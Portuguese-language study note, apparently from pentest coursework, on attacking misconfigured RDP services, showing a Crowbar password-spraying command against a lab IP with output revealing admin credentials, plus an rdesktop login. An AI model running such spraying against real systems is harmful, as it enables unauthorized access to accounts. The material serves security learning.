#redes #protocolo 

# configurações incorretas do RDP

Como o RDP utiliza credenciais do usuário para autenticação, um vetor de ataque comum contra o protocolo RDP é a adivinhação de senha. Embora não seja comum, podemos encontrar um serviço RDP sem senha se houver uma configuração incorreta.

> Uma advertência sobre a adivinhação de senha em instâncias do Windows é que você deve considerar a política de senha do cliente. Em muitos casos, uma conta de usuário será bloqueada ou desativada após um certo número de tentativas de login malsucedidas. Nesse caso, podemos realizar uma técnica específica de adivinhação de senha chamada `Password Spraying`. Essa técnica funciona tentando uma única senha para vários nomes de usuário antes de tentar outra senha, tomando cuidado para evitar o bloqueio da conta.

Usando a ferramenta [Crowbar](https://github.com/galkan/crowbar) , podemos realizar um ataque de pulverização de senha contra o serviço RDP. Como exemplo abaixo, a senha `password123` será testada em uma lista de nomes de usuário no arquivo `usernames.txt`. O ataque encontrou as credenciais válidas como `administrator`: `password123` no host RDP de destino.

### Crowbar - Pulverização de senha RDP

```sh
$ crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

Também podemos usar `Hydra` para realizar um ataque de pulverização de senha RDP.

### Login RDP

```sh
$ rdesktop -u admin -p password123 192.168.2.143

Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses an invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.
     Issuer: CN=WIN-Q8F2KTAI43A

Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate, the connection atempt will be aborted:

    Subject: CN=WIN-Q8F2KTAI43A
     Issuer: CN=WIN-Q8F2KTAI43A
 Valid From: Tue Aug 24 04:20:17 2021
         To: Wed Feb 23 03:20:17 2022

  Certificate fingerprints:

       sha1: cd43d32dc8e6b4d2804a59383e6ee06fefa6b12a
     sha256: f11c56744e0ac983ad69e1184a8249a48d0982eeb61ec302504d7ffb95ed6e57

Do you trust this certificate (yes/no)? yes
```

![[Pasted image 20240502090251.jpg]]